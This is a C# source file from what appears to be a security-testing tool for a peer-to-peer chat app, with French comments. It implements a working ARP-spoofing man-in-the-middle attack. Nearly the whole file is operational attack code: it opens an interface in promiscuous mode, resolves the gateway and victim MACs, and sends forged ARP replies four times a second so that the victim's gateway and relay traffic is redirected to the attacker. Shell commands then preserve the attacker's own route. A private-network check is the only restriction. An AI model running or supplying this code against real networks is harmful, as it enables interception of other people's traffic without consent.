using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using System.Linq;
using SharpPcap;
using PacketDotNet;
using ChatP2P.SecurityTester.Core;
using ChatP2P.SecurityTester.Models;

namespace ChatP2P.SecurityTester.Network
{
    /// <summary>
    /// 🕷️ Module ARP Spoofing pour attaques Man-in-the-Middle (Version simplifiée)
    /// ⚠️ AVERTISSEMENT: Outil de test sécurité - Usage responsable uniquement
    /// </summary>
    public class ARPSpoofer
    {
        private CancellationTokenSource? _spoofingCancellation;
        private bool _isActive = false;
        private ICaptureDevice? _device;
        private PhysicalAddress? _attackerMac;
        private PhysicalAddress? _gatewayMac;
        private PhysicalAddress? _targetMac;
        private PhysicalAddress? _relayMac;
        private IPAddress? _relayIP;

        public event Action<AttackResult>? AttackResult;
        public event Action<string>? LogMessage;

        public async Task<bool> StartARPSpoofing(IPAddress targetIP, IPAddress? secondTargetIP = null)
        {
            try
            {
                LogMessage?.Invoke($"🚀 DÉBUT ARP SPOOFING - Target: {targetIP}");

                // 🛡️ Sécurité: Vérifier que c'est pour test local uniquement
                LogMessage?.Invoke($"🔍 Vérification réseau local pour {targetIP}...");
                if (!IsLocalNetwork(targetIP))
                {
                    LogMessage?.Invoke("❌ SÉCURITÉ: ARP Spoofing autorisé uniquement sur réseau local");
                    LogMessage?.Invoke($"   IP rejetée: {targetIP} (non locale)");
                    return false;
                }
                LogMessage?.Invoke("✅ IP target validée (réseau local)");

                var attackerIP = GetLocalIPAddress();
                LogMessage?.Invoke($"🔍 Initialisation ARP Spoofing...");
                LogMessage?.Invoke($"   Target: {targetIP}");
                LogMessage?.Invoke($"   Attaquant: {attackerIP}");

                // 🌐 Initialiser interface réseau pour envoi packets
                LogMessage?.Invoke("🔧 Initialisation interface réseau...");
                if (!await InitializeNetworkInterface())
                {
                    LogMessage?.Invoke("❌ ÉCHEC: Impossible d'initialiser l'interface réseau");
                    LogMessage?.Invoke("   ⚠️ Vérifiez privilèges admin et SharpPcap/WinPcap installé");
                    return false;
                }
                LogMessage?.Invoke("✅ Interface réseau initialisée avec succès");

                // 🔍 Découvrir MAC du gateway
                LogMessage?.Invoke("🔍 Recherche gateway par défaut...");
                var gatewayIP = GetDefaultGateway();
                if (gatewayIP == null)
                {
                    LogMessage?.Invoke("❌ ÉCHEC: Impossible de détecter le gateway");
                    LogMessage?.Invoke("   ⚠️ Vérifiez connexion réseau et table de routage");
                    return false;
                }

                LogMessage?.Invoke($"✅ Gateway détecté: {gatewayIP}");

                LogMessage?.Invoke($"🔍 Découverte MAC du gateway {gatewayIP}...");
                if (!await DiscoverGatewayMAC(gatewayIP))
                {
                    LogMessage?.Invoke("❌ ÉCHEC: Impossible de découvrir MAC du gateway");
                    LogMessage?.Invoke("   ⚠️ Gateway unreachable ou table ARP vide");
                    return false;
                }
                LogMessage?.Invoke($"✅ MAC Gateway découverte: {_gatewayMac}");

                // 🔍 Découvrir MAC de la target
                LogMessage?.Invoke($"🔍 Découverte MAC de la target {targetIP}...");
                if (!await DiscoverTargetMAC(targetIP))
                {
                    LogMessage?.Invoke("❌ ÉCHEC: Impossible de découvrir MAC de la target");
                    LogMessage?.Invoke($"   ⚠️ Target {targetIP} unreachable ou offline");
                    return false;
                }
                LogMessage?.Invoke($"✅ MAC Target découverte: {_targetMac}");

                // 🎯 DÉTECTER ET EMPOISONNER RELAY SERVER (si sur réseau local)
                _relayIP = null;
                _relayMac = null;
                if (IPAddress.TryParse(SecurityTesterConfig.RelayServerIP, out var relayIP) &&
                    !relayIP.Equals(targetIP) && !relayIP.Equals(gatewayIP))
                {
                    LogMessage?.Invoke($"🔍 Vérification relay server: {relayIP}");

                    // Vérifier si relay est sur le même réseau local
                    if (IsOnSameNetwork(relayIP, gatewayIP))
                    {
                        LogMessage?.Invoke($"📍 Relay sur réseau local - tentative empoisonnement");
                        _relayIP = relayIP;
                        if (await DiscoverTargetMAC(relayIP))
                        {
                            _relayMac = _targetMac; // DiscoverTargetMAC stocke dans _targetMac temporairement
                            // Remettre la vraie target MAC
                            await DiscoverTargetMAC(targetIP);
                            LogMessage?.Invoke($"✅ MAC Relay découverte: {_relayMac}");
                            LogMessage?.Invoke($"🎯 EMPOISONNEMENT TRIPLE: Gateway + Relay + Target");
                        }
                        else
                        {
                            LogMessage?.Invoke($"⚠️ MAC Relay non trouvée - empoisonnement gateway seulement");
                        }
                    }
                    else
                    {
                        LogMessage?.Invoke($"🌐 Relay sur Internet ({relayIP}) - empoisonnement gateway seulement");
                        LogMessage?.Invoke($"📡 Tout trafic vers relay intercepté via gateway");
                    }
                }

                // 🎯 Démarrer ARP spoofing RÉEL BIDIRECTIONNEL
                _spoofingCancellation = new CancellationTokenSource();
                var spoofingTask = Task.Run(() => RealBidirectionalARPSpoofing(targetIP, gatewayIP, _spoofingCancellation.Token));

                _isActive = true;
                LogMessage?.Invoke($"🕷️ ARP Spoofing RÉEL démarré: Target({targetIP}) → Attaquant({attackerIP})");

                AttackResult?.Invoke(new AttackResult
                {
                    Success = true,
                    AttackType = "ARP_SPOOFING_START",
                    Description = $"ARP Spoofing RÉEL actif - Target: {targetIP} → Attaquant: {attackerIP}",
                    TargetPeer = targetIP.ToString()
                });

                return true;
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur ARP Spoofing: {ex.Message}");
                return false;
            }
        }

        public void StopARPSpoofing()
        {
            try
            {
                _spoofingCancellation?.Cancel();
                _isActive = false;

                // Fermer interface réseau
                _device?.Close();
                _device = null;

                LogMessage?.Invoke("⏹️ ARP Spoofing arrêté");

                AttackResult?.Invoke(new AttackResult
                {
                    Success = true,
                    AttackType = "ARP_SPOOFING_STOP",
                    Description = "ARP Spoofing désactivé"
                });
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur arrêt ARP Spoofing: {ex.Message}");
            }
        }

        private Dictionary<string, string> GetArpTable()
        {
            var arpEntries = new Dictionary<string, string>();
            try
            {
                // Lire table ARP système (Windows)
                var process = new System.Diagnostics.Process
                {
                    StartInfo = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = "arp",
                        Arguments = "-a",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };

                process.Start();
                var output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                var lines = output.Split('\n');
                foreach (var line in lines)
                {
                    var parts = line.Trim().Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                    if (parts.Length >= 2 && IPAddress.TryParse(parts[0], out _))
                    {
                        arpEntries[parts[0]] = parts[1];
                    }
                }
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur lecture table ARP: {ex.Message}");
            }
            return arpEntries;
        }

        private async Task<bool> InitializeNetworkInterface()
        {
            try
            {
                LogMessage?.Invoke("📡 Énumération interfaces réseau...");
                var devices = CaptureDeviceList.Instance;
                LogMessage?.Invoke($"   🔍 {devices.Count} interfaces détectées");

                if (devices.Count == 0)
                {
                    LogMessage?.Invoke("❌ Aucune interface réseau détectée par SharpPcap");
                    LogMessage?.Invoke("   ⚠️ Vérifiez installation WinPcap/Npcap");
                    return false;
                }

                // Lister toutes les interfaces pour debug
                LogMessage?.Invoke("📋 Interfaces disponibles:");
                for (int i = 0; i < devices.Count; i++)
                {
                    LogMessage?.Invoke($"   [{i}] {devices[i].Description}");
                }

                // Chercher interface active (pas loopback)
                LogMessage?.Invoke("🔍 Recherche interface non-loopback...");
                foreach (var dev in devices)
                {
                    LogMessage?.Invoke($"   🔧 Test interface: {dev.Description}");

                    if (dev.Description.Contains("Loopback") || dev.Description.Contains("Virtual"))
                    {
                        LogMessage?.Invoke($"   ⏭️ Ignoré (loopback/virtual)");
                        continue;
                    }

                    LogMessage?.Invoke($"   ✅ Interface candidate sélectionnée");
                    LogMessage?.Invoke($"   🔓 Ouverture en mode promiscuous...");

                    _device = dev;
                    _device.Open(DeviceModes.Promiscuous, 1000);

                    // Obtenir MAC de l'interface
                    LogMessage?.Invoke($"   🔍 Recherche MAC pour cette interface...");
                    var networkInterface = NetworkInterface.GetAllNetworkInterfaces()
                        .FirstOrDefault(ni => ni.Description.Contains(dev.Description.Split(' ')[0]));

                    if (networkInterface != null)
                    {
                        _attackerMac = networkInterface.GetPhysicalAddress();
                        LogMessage?.Invoke($"✅ Interface: {dev.Description}");
                        LogMessage?.Invoke($"✅ MAC Attaquant: {_attackerMac}");
                        return true;
                    }
                }

                LogMessage?.Invoke("❌ Impossible de trouver interface réseau valide");
                return false;
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur initialisation interface: {ex.Message}");
                return false;
            }
        }

        private IPAddress? GetDefaultGateway()
        {
            try
            {
                var networkInterfaces = NetworkInterface.GetAllNetworkInterfaces()
                    .Where(n => n.OperationalStatus == OperationalStatus.Up)
                    .Where(n => n.NetworkInterfaceType != NetworkInterfaceType.Loopback);

                foreach (var networkInterface in networkInterfaces)
                {
                    var gatewayAddresses = networkInterface.GetIPProperties().GatewayAddresses;
                    if (gatewayAddresses.Count > 0)
                    {
                        return gatewayAddresses[0].Address;
                    }
                }
                return null;
            }
            catch
            {
                return null;
            }
        }

        private async Task<bool> DiscoverGatewayMAC(IPAddress gatewayIP)
        {
            try
            {
                // Envoyer ARP request pour découvrir MAC du gateway
                LogMessage?.Invoke($"🔍 Découverte MAC du gateway {gatewayIP}...");

                // Utiliser ping pour forcer ARP resolution
                var ping = new Ping();
                var reply = await ping.SendPingAsync(gatewayIP, 1000);

                if (reply.Status == IPStatus.Success)
                {
                    // Lire table ARP système pour obtenir MAC
                    var arpEntries = GetArpTable();
                    if (arpEntries.TryGetValue(gatewayIP.ToString(), out var gatewayMacString))
                    {
                        _gatewayMac = PhysicalAddress.Parse(gatewayMacString.Replace("-", ""));
                        LogMessage?.Invoke($"✅ MAC Gateway: {_gatewayMac}");
                        return true;
                    }
                }

                LogMessage?.Invoke("❌ Impossible de découvrir MAC du gateway");
                return false;
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur découverte MAC: {ex.Message}");
                return false;
            }
        }

        private async Task<bool> DiscoverTargetMAC(IPAddress targetIP)
        {
            try
            {
                // Envoyer ping pour forcer ARP resolution de la target
                var ping = new Ping();
                var reply = await ping.SendPingAsync(targetIP, 1000);

                if (reply.Status == IPStatus.Success)
                {
                    // Lire table ARP système pour obtenir MAC de la target
                    var arpEntries = GetArpTable();
                    if (arpEntries.TryGetValue(targetIP.ToString(), out var targetMacString))
                    {
                        _targetMac = PhysicalAddress.Parse(targetMacString.Replace("-", ""));
                        LogMessage?.Invoke($"✅ MAC Target: {_targetMac}");
                        return true;
                    }
                }

                LogMessage?.Invoke("❌ Impossible de découvrir MAC de la target");
                return false;
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur découverte MAC target: {ex.Message}");
                return false;
            }
        }

        private void RealBidirectionalARPSpoofing(IPAddress targetIP, IPAddress gatewayIP, CancellationToken cancellationToken)
        {
            try
            {
                LogMessage?.Invoke($"🧠 DÉMARRAGE ARP SPOOFING INTELLIGENT");
                LogMessage?.Invoke($"   🎯 CIBLE: {targetIP} → pense que Gateway({gatewayIP}) = ATTAQUANT");
                LogMessage?.Invoke($"   🛡️ ATTAQUANT: Préserve sa propre connectivité vers Gateway({gatewayIP})");
                LogMessage?.Invoke($"   💡 STRATÉGIE: Spoofing unidirectionnel + route preservation");

                if (_relayIP != null && _relayMac != null)
                {
                    LogMessage?.Invoke($"   🎯 BONUS: {targetIP} → pense que Relay({_relayIP}) = ATTAQUANT");
                    LogMessage?.Invoke($"🚀 TRIPLE INTERCEPTION: Gateway + Relay + Connectivité préservée!");
                }

                var attackerIPString = GetLocalIPAddress();
                var attackerIP = IPAddress.Parse(attackerIPString);
                int packetCount = 0;
                int connectivityRefreshCount = 0;

                // 🛡️ DÉMARRAGE DUAL-TASK : Spoofing + Auto-Recovery parallèles
                var aggressiveRecoveryTask = Task.Run(() => AggressiveConnectivityRecovery(attackerIP, gatewayIP, cancellationToken));

                while (!cancellationToken.IsCancellationRequested)
                {
                    // 🎯 SPOOFING INTELLIGENT - UNIDIRECTIONNEL VERS LA VICTIME SEULEMENT

                    // 1️⃣ Dire à Target SEULEMENT que Gateway = Attaquant (intercepte son trafic)
                    SendCorrectARPReply(targetIP, _targetMac, gatewayIP, _attackerMac);

                    // 🎯 2️⃣ Empoisonner le relay server pour la VICTIME uniquement
                    if (_relayIP != null && _relayMac != null)
                    {
                        // Dire à Target que Relay = Attaquant (trafic relay intercepté)
                        SendCorrectARPReply(targetIP, _targetMac, _relayIP, _attackerMac);
                    }

                    packetCount++;

                    if (packetCount % 10 == 0) // Log tous les 10 packets pour éviter spam
                    {
                        LogMessage?.Invoke($"🧠 ARP Spoofing INTELLIGENT #{packetCount}: MITM unidirectionnel actif");
                        LogMessage?.Invoke($"   🎯 VICTIME {targetIP} → pense que {gatewayIP} = {_attackerMac}");
                        LogMessage?.Invoke($"   🛡️ ATTAQUANT → connectivité préservée via recovery parallèle");
                        LogMessage?.Invoke($"   📡 Internet ATTAQUANT: AUTO-RÉCUPÉRATION | Internet VICTIME: INTERCEPTÉ");

                        if (_relayIP != null)
                        {
                            LogMessage?.Invoke($"   🎯 VICTIME {targetIP} → pense que {_relayIP} = {_attackerMac} 🎯");
                            LogMessage?.Invoke($"   🛡️ ATTAQUANT → recovery dual gateway+relay actif");
                        }
                    }

                    // ⏱️ Timing optimisé : 4 packets par seconde (plus agressif)
                    Thread.Sleep(250); // 250ms = 4 packets/sec
                }
            }
            catch (OperationCanceledException)
            {
                LogMessage?.Invoke("⏹️ ARP Spoofing bidirectionnel arrêté");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur ARP spoofing: {ex.Message}");
            }
        }

        private void SendCorrectARPReply(IPAddress recipientIP, PhysicalAddress? recipientMac, IPAddress spoofedIP, PhysicalAddress? senderMac)
        {
            try
            {
                if (_device == null || recipientMac == null || senderMac == null)
                {
                    LogMessage?.Invoke("❌ Données MAC manquantes pour envoi ARP");
                    return;
                }

                // 🛠️ Construire packet ARP Reply CORRECT
                // IMPORTANT: Ethernet header = vers recipient spécifique (pas broadcast)
                var ethernetPacket = new EthernetPacket(senderMac, recipientMac, EthernetType.Arp);

                // 🎯 ARP Reply: "spoofedIP is at senderMac" → recipient
                // Format correct: ArpOperation.Response, targetMac, targetIP, senderMac, senderIP
                var arpPacket = new ArpPacket(ArpOperation.Response, recipientMac, recipientIP, senderMac, spoofedIP);

                ethernetPacket.PayloadPacket = arpPacket;

                // 📡 Envoyer packet sur le réseau
                if (_device is IInjectionDevice injectionDevice)
                {
                    injectionDevice.SendPacket(ethernetPacket);
                }
                else
                {
                    LogMessage?.Invoke("❌ Interface ne supporte pas l'injection de packets");
                    return;
                }

                // Log détaillé seulement pour debug
                // LogMessage?.Invoke($"📡 ARP Reply: {recipientIP} ← {spoofedIP} is at {senderMac}");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur envoi packet ARP: {ex.Message}");
            }
        }

        /// <summary>
        /// 🛡️ Restaure la connectivité de l'attaquant vers une destination donnée
        /// En envoyant une requête ARP légale pour forcer la résolution correcte
        /// </summary>
        private void RestoreAttackerConnectivity(IPAddress attackerIP, IPAddress destinationIP)
        {
            try
            {
                if (_device == null || _gatewayMac == null)
                {
                    // LogMessage?.Invoke($"⚠️ Cannot restore connectivity: missing network data");
                    return;
                }

                // 🔄 Forcer la résolution ARP légale avec un ARP Request
                // Ceci restaure l'entrée ARP correcte dans la table locale de l'attaquant
                var broadcastMac = PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF");
                var ethernetPacket = new EthernetPacket(_attackerMac, broadcastMac, EthernetType.Arp);

                // ARP Request: "Qui a destinationIP ?" (envoyé par attaquant avec sa vraie MAC)
                var arpRequest = new ArpPacket(ArpOperation.Request, broadcastMac, destinationIP, _attackerMac, attackerIP);
                ethernetPacket.PayloadPacket = arpRequest;

                // 📡 Envoyer la requête ARP pour restaurer la route
                if (_device is IInjectionDevice injectionDevice)
                {
                    injectionDevice.SendPacket(ethernetPacket);
                }

                // 🔄 Alternative: Utiliser ping système pour forcer ARP refresh (plus discret)
                Task.Run(async () =>
                {
                    try
                    {
                        using var ping = new Ping();
                        await ping.SendPingAsync(destinationIP, 100); // Quick ping, ignore result
                    }
                    catch { } // Ignore ping failures, but ARP refresh should occur
                });

                // Log seulement pour debug - pas en production
                // LogMessage?.Invoke($"🛡️ Connectivity restored: {attackerIP} → {destinationIP}");
            }
            catch (Exception ex)
            {
                // Silent failure - ne pas spammer les logs
                // LogMessage?.Invoke($"⚠️ Error restoring connectivity: {ex.Message}");
            }
        }

        /// <summary>
        /// 🚀 RÉCUPÉRATION AGRESSIVE de connectivité - Parallel task ultra-agressive
        /// S'exécute en parallèle du spoofing pour maintenir la connectivité attaquant
        /// </summary>
        private void AggressiveConnectivityRecovery(IPAddress attackerIP, IPAddress gatewayIP, CancellationToken cancellationToken)
        {
            try
            {
                LogMessage?.Invoke($"🚀 DÉMARRAGE RECOVERY ULTRA-AGRESSIVE: {attackerIP} → {gatewayIP}");
                LogMessage?.Invoke($"   📡 Fréquence: Toutes les 200ms (5x par seconde)");
                LogMessage?.Invoke($"   🛠️ Méthodes: ARP Request + Ping Multi + Route statique + DNS Flush + ARP Preventif");

                int recoveryCount = 0;
                var gatewayMacOriginal = _gatewayMac; // Sauvegarder MAC originale

                while (!cancellationToken.IsCancellationRequested)
                {
                    recoveryCount++;

                    // 🔄 MÉTHODE 1: ARP Request légitime (force ARP table refresh)
                    RestoreAttackerConnectivity(attackerIP, gatewayIP);

                    // 🔄 MÉTHODE 2: Ping système ultra-rapide (multiples destinations)
                    Task.Run(async () =>
                    {
                        try
                        {
                            using var ping = new Ping();
                            // Ping rapide gateway + DNS publics + relay server
                            _ = ping.SendPingAsync(gatewayIP, 50);
                            _ = ping.SendPingAsync(IPAddress.Parse("8.8.8.8"), 50);
                            _ = ping.SendPingAsync(IPAddress.Parse("1.1.1.1"), 50);

                            // Ping relay server si disponible
                            if (_relayIP != null)
                            {
                                _ = ping.SendPingAsync(_relayIP, 50);
                            }
                        }
                        catch { } // Silent failure
                    });

                    // 🔄 MÉTHODE 3: Restauration directe table ARP locale (Windows)
                    if (recoveryCount % 10 == 0) // Toutes les 2 secondes
                    {
                        Task.Run(() => ForceArpTableRestore(gatewayIP, gatewayMacOriginal));
                    }

                    // 🔄 MÉTHODE 4: Route statique de sécurité
                    if (recoveryCount % 25 == 0) // Toutes les 5 secondes
                    {
                        Task.Run(() => ForceStaticRoute(gatewayIP));
                    }

                    // 🔄 MÉTHODE 5: NOUVELLE - Refresh DNS forcé (évite cache DNS corrompu)
                    if (recoveryCount % 15 == 0) // Toutes les 3 secondes
                    {
                        Task.Run(() => ForceDNSRefresh());
                    }

                    // 🔄 MÉTHODE 6: NOUVELLE - Injection ARP préventive (double sécurité)
                    if (recoveryCount % 5 == 0) // Toutes les secondes
                    {
                        Task.Run(() => PreventiveARPInjection(attackerIP, gatewayIP));
                    }

                    if (recoveryCount % 50 == 0) // Log toutes les 10 secondes
                    {
                        LogMessage?.Invoke($"🛡️ RECOVERY ULTRA-AGRESSIVE #{recoveryCount}: Connectivité forcée");
                        LogMessage?.Invoke($"   📊 ARP Requests: {recoveryCount} envoyées");
                        LogMessage?.Invoke($"   🏓 Ping parallèles: {recoveryCount * 4} tentatives (gateway+DNS+relay)");
                        LogMessage?.Invoke($"   🛠️ Route statique: {recoveryCount / 25} refresh");
                        LogMessage?.Invoke($"   🔄 DNS Flush: {recoveryCount / 15} refresh");
                        LogMessage?.Invoke($"   💉 ARP Preventif: {recoveryCount / 5} injections");
                    }

                    // ⚡ TIMING ULTRA-AGGRESSIF: 5x par seconde
                    Thread.Sleep(200); // 200ms = 5 recovery/sec
                }
            }
            catch (OperationCanceledException)
            {
                LogMessage?.Invoke("🛡️ Recovery agressive arrêtée");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur recovery agressive: {ex.Message}");
            }
        }

        /// <summary>
        /// 🔧 Force la restauration de l'entrée ARP via commandes système Windows
        /// </summary>
        private void ForceArpTableRestore(IPAddress gatewayIP, PhysicalAddress? gatewayMac)
        {
            try
            {
                if (gatewayMac == null) return;

                // Supprimer entrée ARP corrompue
                var deleteCmd = $"arp -d {gatewayIP}";
                ExecuteSystemCommand(deleteCmd);

                // Forcer redécouverte via ping
                var pingCmd = $"ping -n 1 -w 100 {gatewayIP}";
                ExecuteSystemCommand(pingCmd);

                // Optionnel: Ajouter entrée statique (temporaire)
                var macString = gatewayMac.ToString().Replace(":", "-");
                var staticCmd = $"arp -s {gatewayIP} {macString}";
                ExecuteSystemCommand(staticCmd);
            }
            catch { } // Silent failure
        }

        /// <summary>
        /// 🛣️ Force une route statique temporaire vers le gateway
        /// </summary>
        private void ForceStaticRoute(IPAddress gatewayIP)
        {
            try
            {
                var localInterface = GetLocalInterfaceName();
                if (string.IsNullOrEmpty(localInterface)) return;

                // Supprimer route existante
                var deleteCmd = $"route delete {gatewayIP}";
                ExecuteSystemCommand(deleteCmd);

                // Ajouter route statique directe
                var addCmd = $"route add {gatewayIP} mask 255.255.255.255 {gatewayIP} if {localInterface}";
                ExecuteSystemCommand(addCmd);
            }
            catch { } // Silent failure
        }

        /// <summary>
        /// 🔧 Exécute une commande système Windows en arrière-plan
        /// </summary>
        private void ExecuteSystemCommand(string command)
        {
            try
            {
                var process = new System.Diagnostics.Process
                {
                    StartInfo = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/C {command}",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true
                    }
                };
                process.Start();
                process.WaitForExit(1000); // Max 1 seconde
                process.Dispose();
            }
            catch { } // Silent failure
        }

        /// <summary>
        /// 🔍 Obtient le nom de l'interface réseau locale
        /// </summary>
        private string GetLocalInterfaceName()
        {
            try
            {
                var interfaces = NetworkInterface.GetAllNetworkInterfaces();
                foreach (var iface in interfaces)
                {
                    if (iface.OperationalStatus == OperationalStatus.Up &&
                        iface.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                    {
                        return iface.GetIPProperties().GetIPv4Properties().Index.ToString();
                    }
                }
            }
            catch { }
            return "";
        }

        private bool IsLocalNetwork(IPAddress ip)
        {
            // 🛡️ Vérifier que c'est un réseau local (sécurité)
            var bytes = ip.GetAddressBytes();
            return (bytes[0] == 192 && bytes[1] == 168) ||  // 192.168.x.x
                   (bytes[0] == 10) ||                       // 10.x.x.x
                   (bytes[0] == 172 && bytes[1] >= 16 && bytes[1] <= 31) || // 172.16-31.x.x
                   (bytes[0] == 127);                        // 127.x.x.x (localhost)
        }

        public bool IsActive => _isActive;

        private string GetLocalIPAddress()
        {
            try
            {
                // Obtenir l'IP locale réelle (pas localhost)
                var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
                var localIP = host.AddressList
                    .Where(ip => ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    .Where(ip => !IPAddress.IsLoopback(ip))
                    .FirstOrDefault();

                return localIP?.ToString() ?? "Unknown";
            }
            catch
            {
                return "Unknown";
            }
        }

        /// <summary>
        /// Vérifie si une IP est sur le même réseau local qu'une autre
        /// </summary>
        private bool IsOnSameNetwork(IPAddress targetIP, IPAddress gatewayIP)
        {
            try
            {
                // Vérifier si c'est une IP privée (RFC 1918)
                var targetBytes = targetIP.GetAddressBytes();
                var gatewayBytes = gatewayIP.GetAddressBytes();

                // Comparer les 3 premiers octets pour un réseau /24 typique
                if (targetBytes[0] == gatewayBytes[0] &&
                    targetBytes[1] == gatewayBytes[1] &&
                    targetBytes[2] == gatewayBytes[2])
                {
                    return true;
                }

                // Vérifier si c'est dans les plages privées classiques
                if (IsPrivateIP(targetIP))
                {
                    return true;
                }

                return false;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Vérifie si une IP est privée (RFC 1918)
        /// </summary>
        private bool IsPrivateIP(IPAddress ipAddress)
        {
            var bytes = ipAddress.GetAddressBytes();

            // 10.0.0.0/8
            if (bytes[0] == 10)
                return true;

            // 172.16.0.0/12
            if (bytes[0] == 172 && bytes[1] >= 16 && bytes[1] <= 31)
                return true;

            // 192.168.0.0/16
            if (bytes[0] == 192 && bytes[1] == 168)
                return true;

            return false;
        }

        /// <summary>
        /// 🔄 MÉTHODE 5: Force le rafraîchissement du cache DNS pour éviter résolutions corrompues
        /// </summary>
        private void ForceDNSRefresh()
        {
            try
            {
                // Flush DNS cache Windows
                ExecuteSystemCommand("ipconfig /flushdns");

                // Forcer nouvelles résolutions DNS
                Task.Run(async () =>
                {
                    try
                    {
                        _ = await System.Net.Dns.GetHostEntryAsync("google.com");
                        _ = await System.Net.Dns.GetHostEntryAsync("cloudflare.com");
                    }
                    catch { } // Silent failure
                });
            }
            catch { } // Silent failure
        }

        /// <summary>
        /// 🔄 MÉTHODE 6: Injection ARP préventive pour s'assurer que l'attaquant a la bonne route
        /// </summary>
        private void PreventiveARPInjection(IPAddress attackerIP, IPAddress gatewayIP)
        {
            try
            {
                if (_device == null || _gatewayMac == null || _attackerMac == null) return;

                // 🛡️ Injecter ARP Reply légitime pour l'attaquant LUI-MÊME
                // Dire à l'attaquant que Gateway = vraie MAC gateway (force route correcte)
                var broadcastMac = PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF");
                var ethernetPacket = new EthernetPacket(_gatewayMac, _attackerMac, EthernetType.Arp);

                // ARP Reply: "gatewayIP is at _gatewayMac" → attaquant
                var arpReply = new ArpPacket(ArpOperation.Response, _attackerMac, attackerIP, _gatewayMac, gatewayIP);
                ethernetPacket.PayloadPacket = arpReply;

                if (_device is IInjectionDevice injectionDevice)
                {
                    injectionDevice.SendPacket(ethernetPacket);
                }

                // 🔄 Double sécurité: Forcer requête ARP de l'attaquant vers gateway
                RestoreAttackerConnectivity(attackerIP, gatewayIP);
            }
            catch { } // Silent failure - ne pas perturber l'attaque principale
        }

        public void Dispose()
        {
            StopARPSpoofing();
        }
    }
}